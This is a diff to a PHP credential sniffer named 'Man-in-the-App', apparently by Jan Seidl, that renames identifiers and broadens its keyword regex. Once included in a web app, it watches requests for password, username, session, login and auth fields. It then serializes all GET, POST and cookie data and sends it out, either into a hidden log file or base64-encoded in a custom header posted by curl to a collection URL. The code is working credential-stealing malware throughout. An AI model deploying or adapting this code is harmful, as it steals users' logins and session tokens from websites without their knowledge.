@@ -1,9 +1,9 @@
 <?php
 
 /*
-    PHP HTTP REQUEST Credential Sniffer
+    Man-in-the-App HTTP REQUEST Credential Sniffer
 
-    hcs.php - Main Program
+    mita.php - Main Program
 
     Copyright (C) 2012 - 2014 Jan Seidl
 
@@ -30,8 +30,8 @@
 
 /* Constants */
 
-define('HCS_EXF_FILE', 0);
-define('HCS_EXF_HTTP_HEAD', 1);
+define('MITA_EXF_FILE', 0);
+define('MITA_EXF_HTTP_HEAD', 1);
 
 if (stristr(PHP_OS, 'WIN')) {
     define('DS', '\\');
@@ -41,17 +41,17 @@ if (stristr(PHP_OS, 'WIN')) {
 
 /* Configuration */
 
-# define('HCS_EXF_FILE_FILENAME', 'hcs.log');
-define('HCS_EXF_HTTP_HEAD_URL', 'http://localhost/header_dumper.php');
-define('HCS_EXF_HTTP_HEAD_HEADER', 'X-HCS-Payload');
-define('HCS_EXFILTRATION_MODE', HCS_EXF_HTTP_HEAD);
+# define('MITA_EXF_FILE_FILENAME', 'hcs.log');
+define('MITA_EXF_HTTP_HEAD_URL', 'http://localhost/header_dumper.php');
+define('MITA_EXF_HTTP_HEAD_HEADER', 'X-MITA-Payload');
+define('MITA_EXFILTRATION_MODE', MITA_EXF_HTTP_HEAD);
 
 /* Functions */
 
-function hcs_init() {
+function mita_init() {
 
     # Keywords that will trigger the capture (regex)
-    $trigger_keywords = '(p(?:ass|)(?:(word|wd|w|))|user(?:name|)|sess(?:ion|)|login)';
+    $trigger_keywords = '(p(?:(?:ass)?(?:word|wd|w)|ass)|user(?:name|)|sess(?:ion|)|login|auth(?:entication|orization|)|private)';
 
     $request_keys = array_keys($_REQUEST);
     $request_keys_str = implode(" ", $request_keys);
@@ -61,11 +61,11 @@ function hcs_init() {
 
     $match_status = preg_match('/'.$trigger_keywords.'/i', $request_keys_str, $matches);
 
-    if ($match_status === 1) hcs_exfiltrate_session();
+    if ($match_status === 1) mita_exfiltrate_session();
 
-}//end :: hcs_init
+}//end :: mita_init
 
-function hcs_exfiltrate_session() {
+function mita_exfiltrate_session() {
 
     $session_data = Array(
         'GET'       => (array) $_GET,
@@ -77,42 +77,42 @@ function hcs_exfiltrate_session() {
     if (isset($_POST)) $session_data['POST'] = $_POST;
     if (isset($_COOKIE)) $session_data['COOKIE'] = $_COOKIES;
 
-    switch (HCS_EXFILTRATION_MODE) {
-        case HCS_EXF_HTTP_HEAD:
-            hcs_exf_http_head($session_data);
+    switch (MITA_EXFILTRATION_MODE) {
+        case MITA_EXF_HTTP_HEAD:
+            mita_exf_http_head($session_data);
             break;
-        case HCS_EXF_FILE:
+        case MITA_EXF_FILE:
         default:
-            hcs_exf_file($session_data);
+            mita_exf_file($session_data);
             break;
     }//end :: switch
 
-}//end :: hcs_exfiltrate_session
+}//end :: mita_exfiltrate_session
 
-function hcs_exf_file($session_data) {
-    if (!defined('HCS_EXF_FILE_FILENAME')) return false;
+function mita_exf_file($session_data) {
+    if (!defined('MITA_EXF_FILE_FILENAME')) return false;
 
     $filepath = realpath(dirname(__FILE__));
 
-    $line = "#### HCS LOG START ## ".date("d/m/Y H:i:s")." ####\n";
+    $line = "#### MITA LOG START ## ".date("d/m/Y H:i:s")." ####\n";
     $line .= print_r($session_data, true);
-    $line .= "### HCS LOG END ###\n";
+    $line .= "### MITA LOG END ###\n";
 
-    return file_put_contents($filepath.DS.HCS_EXF_FILE_FILENAME, $line, FILE_APPEND | LOCK_EX);
+    return file_put_contents($filepath.DS.MITA_EXF_FILE_FILENAME, $line, FILE_APPEND | LOCK_EX);
     
-}//end :: hcs_exf_file
+}//end :: mita_exf_file
 
-function hcs_exf_http_head($session_data) {
+function mita_exf_http_head($session_data) {
 
-    if (!defined('HCS_EXF_HTTP_HEAD_URL')) return false;
+    if (!defined('MITA_EXF_HTTP_HEAD_URL')) return false;
 
     $ch = curl_init();
-    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt ($ch, CURLOPT_URL, HCS_EXF_HTTP_HEAD_URL);
-    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_URL, MITA_EXF_HTTP_HEAD_URL);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 20);
     curl_setopt($ch, CURLOPT_FORBID_REUSE, 1); 
     curl_setopt($ch, CURLOPT_FRESH_CONNECT, 1); 
-    curl_setopt ($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 
     // Only calling the head
     curl_setopt($ch, CURLOPT_HEADER, true); // header will be at output
@@ -120,7 +120,7 @@ function hcs_exf_http_head($session_data) {
 
     // Set our payload
     $encoded_data = base64_encode(serialize($session_data));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, Array(HCS_EXF_HTTP_HEAD_HEADER.": $encoded_data")); 
+    curl_setopt($ch, CURLOPT_HTTPHEADER, Array(MITA_EXF_HTTP_HEAD_HEADER.": $encoded_data")); 
 
     curl_exec ($ch); // dont mind return
     curl_close ($ch);
@@ -129,6 +129,6 @@ function hcs_exf_http_head($session_data) {
 
 }//end :: if
 
-hcs_init();
+mita_init();
 
 ?>
